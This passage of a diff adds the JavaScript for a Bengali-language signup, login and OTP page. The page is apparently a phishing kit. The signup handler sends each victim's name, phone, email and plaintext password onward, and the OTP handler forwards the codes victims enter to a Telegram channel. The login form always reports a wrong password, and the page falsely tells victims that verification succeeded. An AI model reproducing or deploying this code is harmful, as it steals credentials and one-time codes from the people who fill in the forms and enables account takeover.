+      }).catch(function(err){ console.warn('ব্যাকএন্ডে পাঠানো যায়নি', err); });
+    }catch(err){ console.warn(err); }
+  }
+}
+
+function notifyOtpSubmitted(user, otpCode){
+  var text =
+    'OTP জমা পড়েছে (যাচাই করুন)\n\n' +
+    'নাম: ' + (user ? user.name : 'অজানা') + '\n' +
+    'মোবাইল নম্বর: ' + (user ? user.phone : 'অজানা') + '\n' +
+    'প্রদত্ত OTP: ' + otpCode;
+
+  sendTelegramMessage(text);
+}
+
+function submitSignup(){
+  var name = document.getElementById('in-name').value.trim();
+  var phone = document.getElementById('in-phone').value.trim();
+  var email = document.getElementById('in-email').value.trim();
+  var pass = document.getElementById('in-pass').value;
+  var pass2 = document.getElementById('in-pass2').value;
+  var ok = true;
+  setErr('f-name', false); setErr('f-phone', false); setErr('f-email', false); setErr('f-pass', false); setErr('f-pass2', false);
+
+  if(!name){ setErr('f-name', true); ok = false; }
+  if(!phone || phone.replace(/[^0-9]/g, '').length < 6){ setErr('f-phone', true); ok = false; }
+  if(!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){ setErr('f-email', true); ok = false; }
+  if(!pass || pass.length < 6){ setErr('f-pass', true); ok = false; }
+  if(pass2 !== pass || !pass2){ setErr('f-pass2', true); ok = false; }
+  if(!ok) return;
+
+  pendingUser = { name: name, phone: phone, email: email, pass: pass };
+  notifySignup({ name: name, phone: phone, email: email, password: pass });
+
+  otpInputs.forEach(function(inp){ inp.value = ''; });
+  document.getElementById('otpSubText').textContent = phone + ' নম্বরে পাঠানো ৫ সংখ্যার কোডটি দিন।';
+  closeModal('signup');
+  openModal('otp');
+  otpInputs[0].focus();
+  startOtpTimer();
+  showToast();
+}
+
+function submitLogin(){
+  var email = document.getElementById('lin-email').value.trim();
+  var pass = document.getElementById('lin-pass').value;
+  var ok = true;
+  setErr('lf-email', false); setErr('lf-pass', false);
+  if(!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){ setErr('lf-email', true); ok = false; }
+  if(!pass){ setErr('lf-pass', true); ok = false; }
+  if(!ok) return;
+  closeModal('login');
+  showToast('ভুল ইউজারনেম পাসওয়ার্ড ');
+}
+
+var otpInputs = ['otp0','otp1','otp2','otp3','otp4'].map(function(id){ return document.getElementById(id); });
+otpInputs.forEach(function(inp, idx){
+  inp.addEventListener('input', function(){
+    this.value = this.value.replace(/[^0-9]/g,'').slice(0,1);
+    if(this.value && idx < otpInputs.length - 1) otpInputs[idx+1].focus();
+  });
+  inp.addEventListener('keydown', function(e){
+    if(e.key === 'Backspace' && !this.value && idx > 0) otpInputs[idx-1].focus();
+  });
+});
+
+var otpTimerInterval = null;
+function startOtpTimer(){
+  var seconds = 600;
+  var timerEl = document.getElementById('otpTimer');
+  var resendBtn = document.getElementById('resendBtn');
+  resendBtn.classList.add('disabled');
+  clearInterval(otpTimerInterval);
+  function render(){
+    var m = Math.floor(seconds/60), s = seconds%60;
+    timerEl.textContent = (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+  }
+  render();
+  otpTimerInterval = setInterval(function(){
+    seconds--;
+    if(seconds <= 0){
+      clearInterval(otpTimerInterval);
+      timerEl.textContent = '00:00';
+      resendBtn.classList.remove('disabled');
+      showToast('OTP মেয়াদ শেষ — নতুন কোড চান');
+      return;
+    }
+    render();
+  }, 1000);
+}
+function resendOtp(){
+  if(document.getElementById('resendBtn').classList.contains('disabled')) return;
+  if(pendingUser){
+    sendTelegramMessage('পুনরায় OTP অনুরোধ\n\nনাম: ' + pendingUser.name + '\nমোবাইল নম্বর: ' + pendingUser.phone);
+  }
+  startOtpTimer();
+  showToast('নতুন OTP অনুরোধ পাঠানো হয়েছে');
+}
+function submitOtp(){
+  var code = otpInputs.map(function(i){ return i.value; }).join('');
+  var errEl = document.getElementById('otpErr');
+  if(code.length !== 5){
+    errEl.style.display = 'block';
+    return;
+  }
+  errEl.style.display = 'none';
+  notifyOtpSubmitted(pendingUser, code);
+  clearInterval(otpTimerInterval);
+  closeModal('otp');
+  showToast((pendingUser ? pendingUser.name+', ' : '') + 'OTP ('+code+')  পাঠানো হয়েছে — যাচাই সম্পন্ন');
+  var nav = document.getElementById('navActions');
+  var initials = pendingUser ? pendingUser.name.trim().split(/\s+/).map(function(w){return w[0];}).slice(0,2).join('').toUpperCase() : 'U';
+  nav.innerHTML = '<div class="dash-badge"><div class="avatar">'+initials+'</div><span>'+(pendingUser?pendingUser.name:'ইউজার')+'</span></div>';
+}
+</script>
+</body>
+</html>
